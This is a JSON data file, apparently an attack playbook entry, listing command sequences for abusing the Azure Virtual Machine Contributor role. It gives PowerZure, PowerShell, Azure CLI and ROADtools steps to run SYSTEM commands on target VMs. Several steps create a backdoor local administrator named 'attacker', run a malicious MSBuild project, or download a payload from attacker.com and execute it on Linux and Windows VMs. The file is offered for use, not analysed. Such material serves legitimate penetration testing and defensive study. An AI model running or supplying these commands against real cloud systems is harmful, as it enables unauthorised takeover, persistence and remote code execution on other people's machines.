{
    "AZVMContributor": {
        "meaning": "The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines. The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM.",
        "common": "",
        "windows": {
            "PowerZure": [
                {
                    "order": 1,
                    "command": "Import-Module PowerZure",
                    "description": "Import PowerZure module"
                },
                {
                    "order": 2,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 3,
                    "command": "Invoke-AzureRunCommand -VMName 'TargetVM' -ResourceGroupName 'RG' -Command 'whoami'",
                    "description": "Execute command on target VM using PowerZure"
                }
            ],
            "PowerZure_MSBuild": [
                {
                    "order": 1,
                    "command": "Import-Module PowerZure",
                    "description": "Import PowerZure module"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzureRunMSBuild -VMName 'TargetVM' -ResourceGroupName 'RG' -File 'C:\\temp\\malicious.csproj'",
                    "description": "Execute MSBuild project on target VM"
                }
            ],
            "PowerZure_Program": [
                {
                    "order": 1,
                    "command": "Import-Module PowerZure",
                    "description": "Import PowerZure module"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzureRunProgram -VMName 'TargetVM' -ResourceGroupName 'RG' -Program 'C:\\Windows\\System32\\calc.exe'",
                    "description": "Execute program on target VM using PowerZure"
                }
            ],
            "PowerShell_Native": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG' -VMName 'TargetVM' -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\malicious-script.ps1'",
                    "description": "Execute PowerShell script on target VM"
                },
                {
                    "order": 3,
                    "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG' -VMName 'TargetVM' -CommandId 'RunPowerShellScript' -ScriptString 'net user attacker password123 /add; net localgroup administrators attacker /add'",
                    "description": "Create new admin user on target VM"
                }
            ]
        },
        "linux": {
            "AzureCLI": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az vm run-command invoke --resource-group 'RG' --name 'TargetVM' --command-id RunShellScript --scripts 'whoami && id'",
                    "description": "Execute shell command on target VM"
                },
                {
                    "order": 3,
                    "command": "az vm run-command invoke --resource-group 'RG' --name 'TargetVM' --command-id RunShellScript --scripts 'curl -o /tmp/payload.sh http://attacker.com/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh'",
                    "description": "Download and execute malicious script on target VM"
                }
            ],
            "AzureCLI_Windows": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az vm run-command invoke --resource-group 'RG' --name 'TargetVM' --command-id RunPowerShellScript --scripts 'whoami; Get-ComputerInfo'",
                    "description": "Execute PowerShell commands on Windows VM"
                },
                {
                    "order": 3,
                    "command": "az vm run-command invoke --resource-group 'RG' --name 'TargetVM' --command-id RunPowerShellScript --scripts 'Invoke-WebRequest -Uri http://attacker.com/payload.ps1 -OutFile C:\\temp\\payload.ps1; powershell -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1'",
                    "description": "Download and execute PowerShell payload on Windows VM"
                }
            ],
            "ROADtools": [
                {
                    "order": 1,
                    "command": "roadrecon auth -u user@domain.com -p password",
                    "description": "Authenticate with ROADtools"
                },
                {
                    "order": 2,
                    "command": "roadrecon gather --mfa",
                    "description": "Gather Azure information including VM Contributor privileges"
                }
            ]
        }
    }
}
